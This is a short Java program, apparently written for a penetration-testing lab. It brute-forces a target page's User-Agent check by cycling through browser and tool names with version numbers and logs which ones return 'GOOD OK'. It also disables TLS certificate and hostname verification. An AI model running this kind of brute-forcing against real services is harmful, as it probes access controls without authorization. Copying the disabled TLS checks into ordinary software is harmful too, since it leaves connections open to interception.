package org.example;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.HttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.conn.ssl.TrustSelfSignedStrategy;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.ssl.SSLContexts;
import javax.net.ssl.SSLContext;
import org.apache.http.util.EntityUtils;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;

public class UserAgentBruteForce {
    public static void main(String[] args) {
        String[] userAgents = {"Mozilla", "AppleWebKit", "Motorola", "Curl", "Chrome", "Safari", "Tor", "Python"};
        int maxVersion = 150;

        try {
            SSLContext sslContext = SSLContexts.custom()
                    .loadTrustMaterial(new TrustSelfSignedStrategy())
                    .build();

            HttpClient httpClient = HttpClients.custom()
                    .setSSLSocketFactory(new SSLConnectionSocketFactory(sslContext, NoopHostnameVerifier.INSTANCE))
                    .build();

            String targetURL = "https://pentest.blackbox.team:444/index.php";

            try (BufferedWriter writer = new BufferedWriter(new FileWriter("responses.txt"));
                 BufferedWriter goodsWriter = new BufferedWriter(new FileWriter("goods.txt"))) {
                for (String userAgent : userAgents) {
                    for (int version = 1; version <= maxVersion; version++) {
                        String userAgentString = userAgent + "/" + version + ".0";

                        try {
                            HttpGet request = new HttpGet(targetURL);
                            request.addHeader("User-Agent", userAgentString);
                            HttpResponse response = httpClient.execute(request);

                            String responseContent = EntityUtils.toString(response.getEntity());
                            boolean isValid = response.getStatusLine().getStatusCode() == 200 && responseContent.contains("GOOD OK");

                            System.out.println(isValid
                                    ? "Found a valid User-Agent: " + userAgentString
                                    : "Access denied for User-Agent: " + userAgentString);


                            writer.write(isValid ? "Found a valid User-Agent: " : "Access denied for User-Agent: ");
                            writer.write(userAgentString + "\n");
                            writer.write("Response Status: " + response.getStatusLine() + "\n");
                            writer.write("Response Content:\n" + responseContent + "\n\n");


                            if (isValid) {
                                goodsWriter.write(userAgentString + "\n");
                            }
                        } catch (Exception e) {
                            System.out.println("Error for User-Agent: " + userAgentString);
                            e.printStackTrace();
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
